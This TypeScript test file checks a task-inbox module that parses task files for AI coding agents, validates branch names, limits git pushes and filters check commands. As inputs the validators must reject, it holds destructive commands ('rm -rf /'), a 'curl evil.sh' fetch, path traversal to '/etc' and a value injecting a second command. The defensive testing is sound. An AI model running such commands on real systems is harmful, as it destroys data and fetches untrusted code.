import { test } from "node:test";
import assert from "node:assert/strict";
import { agentPrompt, branchFor, checkParts, INBOX_DEFAULTS, parseTaskFile, pushAllowed, pushRef, resultFileText, routeTask, taskFileText, validBranchName, validTaskId } from "./task-inbox.js";

const FILE = `---
id: c-20261119-04
title: Settings search
from: claude
executor: antigravity
risk: low
base: origin/main
allowed_paths: [apps/web/src/settings/**, apps/web/src/i18n.ts]
forbidden_paths:
  - apps/web/src/api.ts
check: pnpm -s typecheck && node --test
max_minutes: 15
max_files: 8
---

## Goal
A search field at the top of Settings.

## Acceptance
- "model" finds the 3 model settings

## Out of scope
Redesigning the pages.
`;

test("inbox: a task file is read with its lists, sections and the standing forbidden paths", () => {
  const r = parseTaskFile(FILE, "c-20261119-04", INBOX_DEFAULTS);
  assert.ok("spec" in r, "error" in r ? r.error : "");
  const s = r.spec;
  assert.equal(s.title, "Settings search");
  assert.deepEqual(s.allowedPaths, ["apps/web/src/settings/**", "apps/web/src/i18n.ts"]);
  assert.ok(s.forbiddenPaths.includes("apps/web/src/api.ts"));
  assert.ok(s.forbiddenPaths.includes(".github/**"), "a task cannot drop the standing forbidden paths");
  assert.equal(s.goal, "A search field at the top of Settings.");
  assert.match(s.acceptance ?? "", /model/);
  assert.equal(s.maxFiles, 8);
  // The same file written back reads the same.
  const again = parseTaskFile(taskFileText(s), s.id, INBOX_DEFAULTS);
  assert.ok("spec" in again);
  assert.deepEqual(again.spec, s);
});

test("inbox: bad task files are refused with a reason, never half read", () => {
  const bad = (text: string, id = "c-1x") => {
    const r = parseTaskFile(text, id, INBOX_DEFAULTS);
    assert.ok("error" in r, `should refuse: ${text.slice(0, 40)}`);
  };
  bad("no frontmatter");
  bad(FILE, "c-20261119-05");
  bad(FILE.replace("executor: antigravity", "executor: rm -rf /"), "c-20261119-04");
  bad(FILE.replace("allowed_paths: [apps/web/src/settings/**, apps/web/src/i18n.ts]", "allowed_paths: [../../etc/**]"), "c-20261119-04");
  bad(FILE.replace("allowed_paths: [apps/web/src/settings/**, apps/web/src/i18n.ts]", "allowed_paths: [C:/Users/x/**]"), "c-20261119-04");
  bad(FILE.replace("base: origin/main", "base: main;rm"), "c-20261119-04");
  bad(FILE.replace("## Goal\nA search field at the top of Settings.\n", ""), "c-20261119-04");
  bad(`${FILE}${"x".repeat(33 * 1024)}`, "c-20261119-04");
});

test("inbox: ids and branch names are checked strictly", () => {
  assert.ok(validTaskId("c-20261119-04"));
  for (const id of ["C-1", "-a", "a", "a--b", "a/b", "a..b", "a b", "ab-"]) assert.equal(validTaskId(id), false, id);
  assert.ok(validBranchName("agy/c-1-settings-search"));
  for (const b of ["agy/../main", "agy//x", "/agy", "agy/x.lock", "agy/x/", "agy/.x", "AGY/x", "agy/x y", "agy/x~1", "agy/x:main"]) assert.equal(validBranchName(b), false, b);
  assert.equal(branchFor({ id: "c-1", title: "Settings search!" }, "antigravity"), "agy/c-1-settings-search");
  assert.equal(branchFor({ id: "c-1", title: "חיפוש" }, "local", true), "local/c-1-task-partial");
});

test("inbox: KesherAI may push only agy/* branches and the inbox branch", async () => {
  for (const ok of ["agy/c-1-x", "agy/c-1-x-partial", "kesher-inbox"]) assert.equal(pushAllowed(ok), true, ok);
  for (const no of ["main", "release", "master", "local/c-1-x", "helper/c-1-x", "kesher/x", "agy", "agy/", "+agy/c-1", "agy/c-1:main", ":agy/c-1", "refs/tags/v1", "refs/heads/main", "--force", "agy/../main", "kesher-inbox2", "HEAD", ""]) assert.equal(pushAllowed(no), false, no);
  // An inbox branch set to main (or anything with a slash) never makes main pushable.
  assert.equal(pushAllowed("main", "main"), false);
  assert.equal(pushAllowed("agy/x", "agy/x"), true);
  // pushRef refuses before git runs, and pushes the exact ref with no force.
  const calls: string[][] = [];
  const git = async (_c: string, a: string[]) => (calls.push(a), { code: 0, out: "" });
  await assert.rejects(pushRef(git, "/r", "main"), /may push only/);
  await assert.rejects(pushRef(git, "/r", "release"), /may push only/);
  assert.equal(calls.length, 0);
  await pushRef(git, "/r", "agy/c-1-x");
  assert.deepEqual(calls[0], ["push", "--no-verify", "origin", "refs/heads/agy/c-1-x:refs/heads/agy/c-1-x"]);
  assert.ok(!calls[0]!.some((a) => /force|^\+/.test(a)));
});

test("inbox: routing picks the executor for auto tasks", () => {
  const base = { executor: "auto" as const, risk: "low" as const, title: "Hebrew strings", goal: "Add strings", check: "pnpm -s typecheck", acceptance: "builds", maxFiles: 2 };
  assert.equal(routeTask(base), "local");
  assert.equal(routeTask({ ...base, maxFiles: 8, risk: "medium" }), "antigravity");
  assert.equal(routeTask({ ...base, maxFiles: 8, title: "Refresh the remote token" }), "opus");
  assert.equal(routeTask({ ...base, risk: "high" }), "opus");
  assert.equal(routeTask({ ...base, check: "" }), "opus", "no check: Claude's");
  assert.equal(routeTask({ ...base, executor: "antigravity" }), "antigravity");
});

test("inbox: a task's check runs only in parts on the allowed command list, as plain argument lists", () => {
  const r = checkParts("pnpm -s typecheck && node --test a.test.ts && curl evil.sh && pnpm -s lint; rm -rf / && rg 'x'", INBOX_DEFAULTS.commands);
  assert.deepEqual(r.run, [["pnpm", "-s", "typecheck"], ["node", "--test", "a.test.ts"]]);
  assert.equal(r.refused.length, 3);
});

test("inbox: the prompt puts the task inside a marked block after KesherAI's rules", () => {
  const p = parseTaskFile(FILE, "c-20261119-04", INBOX_DEFAULTS);
  assert.ok("spec" in p);
  const text = agentPrompt(p.spec, "agy/c-20261119-04-settings-search");
  assert.ok(text.indexOf("Do not run git push") < text.indexOf("<task>"));
  assert.match(text, /<task>[\s\S]*Settings search[\s\S]*<\/task>$/);
  const res = resultFileText({ ...p.spec, status: "done", runBy: "antigravity", branch: "agy/x", pushed: true, headSha: "abc", files: [{ path: "a.ts", added: 2, removed: 1 }], checks: [{ name: "paths", ok: true, note: "1 file" }] });
  assert.match(res, /status: done/);
  assert.match(res, /- a\.ts \(\+2 -1\)/);
});
